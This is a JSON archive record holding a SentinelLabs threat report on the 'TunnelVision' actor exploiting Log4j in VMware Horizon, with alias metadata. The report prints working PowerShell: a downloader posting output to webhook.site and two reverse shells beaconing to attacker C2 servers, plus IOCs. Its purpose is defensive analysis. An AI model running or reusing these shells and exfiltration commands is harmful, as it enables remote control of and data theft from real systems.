{
    "id": "3b21c773-28a6-4749-b665-65c1e5141ca0",
    "created_at": "2023-01-12T15:01:11.322602Z",
    "updated_at": "2025-03-27T02:16:11.529209Z",
    "deleted_at": null,
    "sha1_hash": "990ffaab1bc209b7b277f0b47f0ddf8b9434f9b0",
    "title": "2022-02-17 - Log4j2 In The Wild - Iranian-Aligned Threat Actor “TunnelVision” Actively Exploiting VMware Horizon",
    "authors": "",
    "file_creation_date": "2022-05-27T21:28:26Z",
    "file_modification_date": "2022-05-27T21:28:26Z",
    "file_size": 231403,
    "plain_text": "# Log4j2 In The Wild | Iranian-Aligned Threat Actor “TunnelVision” Actively Exploiting VMware Horizon\n\n**[sentinelone.com/labs/log4j2-in-the-wild-iranian-aligned-threat-actor-tunnelvision-actively-exploiting-vmware-horizon/](https://www.sentinelone.com/labs/log4j2-in-the-wild-iranian-aligned-threat-actor-tunnelvision-actively-exploiting-vmware-horizon/)**\n\nAmitai Ben Shushan Ehrlich\n\n**By Amitai Ben Shushan Ehrlich and Yair Rigevsky**\n\n## Executive Summary\n\nSentinelLabs has been tracking the activity of an Iranian-aligned threat actor operating\nin the Middle-East and the US.\nDue to the threat actor’s heavy reliance on tunneling tools, as well as the unique way it\nchooses to widely deploy those, we track this cluster of activity as TunnelVision.\nMuch like other Iranian threat actors operating in the region lately, TunnelVision’s\nactivities were linked to deployment of ransomware, making the group a potentially\ndestructive actor.\n\n## Overview\n\nTunnelVision activities are characterized by wide-exploitation of 1-day vulnerabilities in target\nregions. During the time we’ve been tracking this actor, we have observed wide exploitation\nof Fortinet FortiOS (CVE-2018-13379), Microsoft Exchange (ProxyShell) and recently\n\n\n-----\n\nLog4Shell. In almost all of those cases, the threat actor deployed a tunneling tool wrapped in\na unique fashion. The most commonly deployed tunneling tools used by the group are Fast\nReverse Proxy Client (FRPC) and Plink.\n\nTunnelVision activities are correlated to some extent with parts of Microsoft’s Phosphorus, as\ndiscussed further in the Attribution section.\n\nIn this post, we highlight some of the activities we recently observed from TunnelVision\noperators, focusing around exploitation of VMware Horizon Log4j vulnerabilities.\n\n## VMware Horizon Exploitation\n\nThe exploitation of Log4j in VMware Horizon is characterized by a malicious process\nspawned from the Tomcat service of the VMware product ( C:\\Program\n```\nFiles\\VMware\\VMware View\\Server\\bin\\ws_TomcatService.exe ).\n\n```\nTunnelVision attackers have been actively exploiting the vulnerability to run malicious\nPowerShell commands, deploy backdoors, create backdoor users, harvest credentials and\nperform lateral movement.\n\nTypically, the threat actor initially exploits the Log4j vulnerability to run PowerShell\ncommands directly, and then runs further commands by means of PS reverse shells,\nexecuted via the Tomcat process.\n\n## PowerShell Commands\n\nTunnelVision operators exploited the Log4j vulnerability in VMware Horizon to run\nPowerShell commands, sending outputs back utilizing a webhook. In this example, the threat\n[actor attempted to download ngrok to a compromised VMware Horizon server:](https://ngrok.com/)\n```\ntry{\n  (New-Object\nSystem.Net.WebClient).DownloadFile(\"hxxp://transfer.sh/uSeOFn/ngrok.exe\",\"C:\\\\Users\\Pu\n  Rename-Item 'c://Users//public//new.txt' 'microsoft.exe';\n  $a=iex 'dir \"c://Users//public//\"' | Out-String;\n  iwr -method post -body $a https://webhook.site/{RANDOM-GUID} -UseBasicParsing;\n}catch{\n  iwr -method post -body $Error[0] https://webhook.site/{RANDOM-GUID} UseBasicParsing;\n}\n\n```\nThroughout the activity the usage of multiple legitimate services was observed. Given an\nenvironment is compromised by TunnelVision, it might be helpful to look for outbound\nconnections to any of those legitimate public services:\n\ntransfer.sh\n\n\n-----\n\npastebin.com\nwebhook.site\nufile.io\nraw.githubusercontent.com\n\n## Reverse Shell #1\n```\n$c = \"\"\n$p = \"\"\n$r = \"\"\n$u = \"hxxps://www.microsoft-updateserver.cf/gadfTs55sghsSSS\"\n$wc = New-Object System.Net.WebClient\n$li = (Get-NetIPAddress -AddressFamily IPv4).IPAddress[0];\n$c = \"whoami\"\n$c = 'Write-Host \" \";'+$c\n$r = &(gcm *ke-e*) $c | Out-String > \"c:\\programdata\\$env:COMPUTERNAME-$li\"\n$ur = $wc.UploadFile(\"$u/phppost.php\", \"c:\\programdata\\$env:COMPUTERNAME-$li\")\nwhile($true)\n{\n  $c = $wc.DownloadString(\"$u/$env:COMPUTERNAME-$li/123.txt\")\n  $c = 'Write-Host \" \";'+$c\n  if($c -ne $p)\n  {\n    $r = &(gcm *ke-e*) $c | Out-String > \"c:\\programdata\\$env:COMPUTERNAME-$li\"\n    $p = $c\n    $ur = $wc.UploadFile(\"$u/phppost.php\",\n\"c:\\programdata\\$env:COMPUTERNAME-$li\")\n  }\n  sleep 3\n}\n\n```\nReverse Shell #1 was used in the past by TunnelVision operators\n(7feb4d36a33f43d7a1bb254e425ccd458d3ea921), utilizing a different C2 server:\n“hxxp://google.onedriver-srv.ml/gadfTs55sghsSSS”. This C2 was referenced in several\n[articles analyzing TunnelVision activities.](https://news.sophos.com/en-us/2021/11/18/new-ransomware-actor-uses-password-protected-archives-to-bypass-encryption-protection/)\n\nThroughout the activity the threat actor leveraged another domain, `service-`\n```\nmanagement[.]tk, used to host malicious payloads. According to VirusTotal, this domain\n\n```\nwas also used to host a zip file (d28e07d2722f771bd31c9ff90b9c64d4a188435a) containing\na custom backdoor (624278ed3019a42131a3a3f6e0e2aac8d8c8b438).\n\nThe backdoor drops an additional executable file\n(e76e9237c49e7598f2b3f94a2b52b01002f8e862) to `%ProgramData%\\Installed`\n```\nPackages\\InteropServices.exe and registers it as a service named “InteropServices”.\n\n```\nThe dropped executable contains an obfuscated version of the reverse shell as described\nabove, beaconing to the same C2 server ( www[.]microsoft-updateserver[.]cf ).\nAlthough it is not encrypted, it is deobfuscated and executed in a somewhat similar manner\n[to how PowerLess another backdoor used by the group executes its PowerShell payload](https://www.cybereason.com/blog/powerless-trojan-iranian-apt-phosphorus-adds-new-powershell-backdoor-for-espionage)\n\n\n-----\n\n## Reverse Shell #2\n```\n$hst = \"51.89.135.142\";\n$prt = 443;\nfunction watcher() {;\n  $limit = (Get - Random - Minimum 3 - Maximum 7);\n  $stopWatch = New - Object - TypeName System.Diagnostics.Stopwatch;\n  $timeSpan = New - TimeSpan - Seconds $limit;\n  $stopWatch.Start();\n  while ((($stopWatch.Elapsed).TotalSeconds - lt $timeSpan.TotalSeconds) ) {};\n  $stopWatch.Stop();\n};\nwatcher;\n$arr = New - Object int[] 500;\nfor ($i = 0;\n$i - lt 99;\n$i++) {;\n  $arr[$i] = (Get - Random - Minimum 1 - Maximum 25);\n};\nif ($arr[0] - gt 0) {;\n  $valksdhfg = New - Object System.Net.Sockets.TCPClient($hst, $prt);\n  $banljsdfn = $valksdhfg.GetStream();\n  [byte[]]$bytes = 0..65535|% {\n    0\n  };\n  while (($i = $banljsdfn.Read($bytes, 0, $bytes.Length)) - ne 0) {;\n    $lkjnsdffaa = (New - Object - TypeName\nSystem.Text.ASCIIEncoding).GetString($bytes, 0, $i);\n    $nsdfgsahjxx = (&(gcm('*ke-exp*')) $lkjnsdffaa 2 > &1 | Out - String );\n    $nsdfgsahjxx2 = $nsdfgsahjxx + (pwd).Path + \"> \";\n    $sendbyte = ([text.encoding]::ASCII).GetBytes($nsdfgsahjxx2);\n    $banljsdfn.Write($sendbyte, 0, $sendbyte.Length);\n    $banljsdfn.Flush();\n    watcher\n  };\n  $valksdhfg.Close();\n};\n\n```\nMost of the “online” activities we observed were performed from this PowerShell backdoor. It\n[seems to be a modified variant of a publicly available PowerShell one-liner.](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)\n\nAmong those activities were:\n\nExecution of recon commands.\nCreation of a backdoor user and adding it to the administrators group.\nCredential harvesting using Procdump, SAM hive dumps and comsvcs MiniDump.\nDownload and execution of tunneling tools, including Plink and Ngrok, used to tunnel\nRDP traffic.\n[Execution of a reverse shell utilizing VMware Horizon NodeJS component[1,2].](https://www.sprocketsecurity.com/blog/crossing-the-log4j-horizon-a-vulnerability-with-no-return)\n[Internal subnet RDP scan using a publicly available port scan script.](https://github.com/InfosecMatter/Minimalistic-offensive-security-tools/blob/master/port-scan-tcp.ps1)\n\n\n-----\n\nThroughout the activity, the threat actor utilized a github repository VmWareHorizon of an\naccount owned by the threat actor, using the name “protections20”.\n\n## Attribution\n\nTunnelVision activities have been discussed previously and are tracked by other vendors\nunder a variety of names, such as Phosphorus (Microsoft) and, confusingly, either Charming\nKitten or Nemesis Kitten (CrowdStrike).\n\nThis confusion arises since activity that Microsoft recognizes as a single group,\n“Phosphorous”, overlaps with activity that CrowdStrike distinguishes as belonging to two\ndifferent actors, Charming Kitten and Nemesis Kitten.\n\nWe track this cluster separately under the name “TunnelVision”. This does not imply we\nbelieve they are necessarily unrelated, only that there is at present insufficient data to treat\nthem as identical to any of the aforementioned attributions.\n\n## Indicators of Compromise\n\n**TYPE** **INDICATOR** **NOTES**\n\n\nDomain www[.]microsoftupdateserver[.]cf\n\n\nCommand and Control (C2) Server\n\n\nDomain www[.]service-management[.]tk Payload server\n\nIP 51.89.169[.]198 Command and Control (C2) Server\n\nIP 142.44.251[.]77 Command and Control (C2) Server\n\nIP 51.89.135[.]142 Command and Control (C2) Server\n\nIP 51.89.190[.]128 Command and Control (C2) Server\n\nIP 51.89.178[.]210 Command and Control (C2) Server,\nTunneling Server\n\nIP 142.44.135[.]86 Tunneling Server\n\nIP 182.54.217[.]2 Payload Server\n\n\nGithub\nAccount\n\n\nhttps://github.com/protections20 Account utilized to host payloads\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-17 - Log4j2 In The Wild - Iranian-Aligned Threat Actor “TunnelVision” Actively Exploiting VMware Horizon.pdf"
    ],
    "report_names": [
        "2022-02-17 - Log4j2 In The Wild - Iranian-Aligned Threat Actor “TunnelVision” Actively Exploiting VMware Horizon.pdf"
    ],
    "threat_actors": [
        {
            "id": "82b92285-4588-48c9-8578-bb39f903cf62",
            "created_at": "2022-10-25T15:50:23.850506Z",
            "updated_at": "2025-03-27T02:00:55.501372Z",
            "deleted_at": null,
            "main_name": "Charming Kitten",
            "aliases": [
                "Charming Kitten"
            ],
            "source_name": "MITRE:Charming Kitten",
            "tools": [
                "DownPaper"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "6b4a82e8-21f1-4bc7-84cf-e27334998b48",
            "created_at": "2022-10-25T16:07:23.84296Z",
            "updated_at": "2025-03-27T02:02:09.997164Z",
            "deleted_at": null,
            "main_name": "DEV-0270",
            "aliases": [
                "DEV-0270",
                "DireFate",
                "Lord Nemesis",
                "Nemesis Kitten",
                "Yellow Dev 23",
                "Yellow Dev 24"
            ],
            "source_name": "ETDA:DEV-0270",
            "tools": [
                "Impacket",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "WmiExec"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "eaef3218-1f8c-4767-b1ff-da7a6662acc0",
            "created_at": "2023-03-04T02:01:54.110909Z",
            "updated_at": "2025-03-27T02:00:03.124083Z",
            "deleted_at": null,
            "main_name": "DEV-0270",
            "aliases": [
                "Nemesis Kitten",
                "Storm-0270"
            ],
            "source_name": "MISPGALAXY:DEV-0270",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d8af157e-741b-4933-bb4a-b78490951d97",
            "created_at": "2023-01-06T13:46:38.748929Z",
            "updated_at": "2025-03-27T02:00:02.908256Z",
            "deleted_at": null,
            "main_name": "APT35",
            "aliases": [
                "Newscaster Team",
                "Magic Hound",
                "G0059",
                "Phosphorus",
                "Mint Sandstorm",
                "TunnelVision",
                "COBALT MIRAGE"
            ],
            "source_name": "MISPGALAXY:APT35",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "04888f75-158b-47f9-8ad9-4ff83f618ece",
            "created_at": "2024-05-01T02:03:08.03763Z",
            "updated_at": "2025-03-27T02:05:17.319276Z",
            "deleted_at": null,
            "main_name": "COBALT MIRAGE",
            "aliases": [
                "Nemesis Kitten ",
                "PHOSPHORUS ",
                "TunnelVision ",
                "UNC2448 ",
                "DEV-0270 "
            ],
            "source_name": "Secureworks:COBALT MIRAGE",
            "tools": [
                " Custom powershell scripts",
                " DiskCryptor",
                " Drokbk",
                " FRPC",
                " Fast Reverse Proxy (FRP)",
                " Impacket wmiexec",
                " Ngrok",
                " Plink",
                " PowerLessCLR",
                " TunnelFish",
                "BitLocker"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "029625d2-9734-44f9-9e10-b894b4f57f08",
            "created_at": "2023-01-06T13:46:38.364105Z",
            "updated_at": "2025-03-27T02:00:02.815023Z",
            "deleted_at": null,
            "main_name": "Charming Kitten",
            "aliases": [
                "Parastoo",
                "iKittens",
                "Group 83",
                "NewsBeef",
                "G0058",
                "CharmingCypress"
            ],
            "source_name": "MISPGALAXY:Charming Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08a3b64c-8e18-455d-af57-28dca63808c4",
            "created_at": "2024-05-01T02:03:08.027871Z",
            "updated_at": "2025-03-27T02:05:17.313679Z",
            "deleted_at": null,
            "main_name": "COBALT ILLUSION",
            "aliases": [
                "APT42 ",
                "Charming Kitten ",
                "CharmingCypress ",
                "ITG18 ",
                "Magic Hound ",
                "Mint Sandstorm sub-group ",
                "NewsBeef ",
                "Newscaster ",
                "PHOSPHORUS sub-group ",
                "TA453 ",
                "UNC788 ",
                "Yellow Garuda ",
                "APT35 "
            ],
            "source_name": "Secureworks:COBALT ILLUSION",
            "tools": [
                " MagicHound Toolset",
                " PupyRAT",
                "Browser Exploitation Framework (BeEF)"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e3676dfe-3d40-4b3a-bfbd-4fc1f8c896f4",
            "created_at": "2022-10-25T15:50:23.808974Z",
            "updated_at": "2025-03-27T02:00:55.550912Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "Magic Hound",
                "TA453",
                "COBALT ILLUSION",
                "Charming Kitten",
                "ITG18",
                "Phosphorus",
                "APT35",
                "Mint Sandstorm"
            ],
            "source_name": "MITRE:Magic Hound",
            "tools": [
                "Impacket",
                "CharmPower",
                "FRP",
                "Mimikatz",
                "Systeminfo",
                "ipconfig",
                "netsh",
                "PowerLess",
                "Pupy",
                "DownPaper",
                "PsExec",
                "Havij",
                "sqlmap"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1699fb41-b83f-42ff-a6ec-984ae4a1031f",
            "created_at": "2022-10-25T16:07:23.83826Z",
            "updated_at": "2025-03-27T02:02:09.995863Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "APT 35",
                "Ballistic Bobcat",
                "Charming Kitten",
                "CharmingCypress",
                "Cobalt Illusion",
                "Cobalt Mirage",
                "Educated Manticore",
                "Magic Hound",
                "Mint Sandstorm",
                "Operation BadBlood",
                "Operation Sponsoring Access",
                "Operation SpoofedScholars",
                "Operation Thamar Reservoir",
                "Phosphorus",
                "TA453",
                "TEMP.Beanie",
                "Tarh Andishan",
                "Timberworm",
                "TunnelVision",
                "UNC788",
                "Yellow Garuda"
            ],
            "source_name": "ETDA:Magic Hound",
            "tools": [
                "7-Zip",
                "AnvilEcho",
                "BASICSTAR",
                "CORRUPT KITTEN",
                "CWoolger",
                "CharmPower",
                "ChromeHistoryView",
                "CommandCam",
                "DistTrack",
                "DownPaper",
                "FRP",
                "Fast Reverse Proxy",
                "FireMalv",
                "Ghambar",
                "GoProxy",
                "GorjolEcho",
                "HYPERSCRAPE",
                "Havij",
                "MPK",
                "MPKBot",
                "Matryoshka",
                "Matryoshka RAT",
                "MediaPl",
                "Mimikatz",
                "MischiefTut",
                "NETWoolger",
                "NOKNOK",
                "PINEFLOWER",
                "POWERSTAR",
                "PowerLess Backdoor",
                "PsList",
                "Pupy",
                "PupyRAT",
                "SNAILPROXY",
                "Shamoon",
                "TDTESS",
                "WinRAR",
                "WoolenLogger",
                "Woolger",
                "pupy",
                "sqlmap"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535671,
    "ts_updated_at": 1743041771,
    "ts_creation_date": 1653686906,
    "ts_modification_date": 1653686906,
    "files": {
        "pdf": "https://archive.orkl.eu/990ffaab1bc209b7b277f0b47f0ddf8b9434f9b0.pdf",
        "text": "https://archive.orkl.eu/990ffaab1bc209b7b277f0b47f0ddf8b9434f9b0.txt",
        "img": "https://archive.orkl.eu/990ffaab1bc209b7b277f0b47f0ddf8b9434f9b0.jpg"
    }
}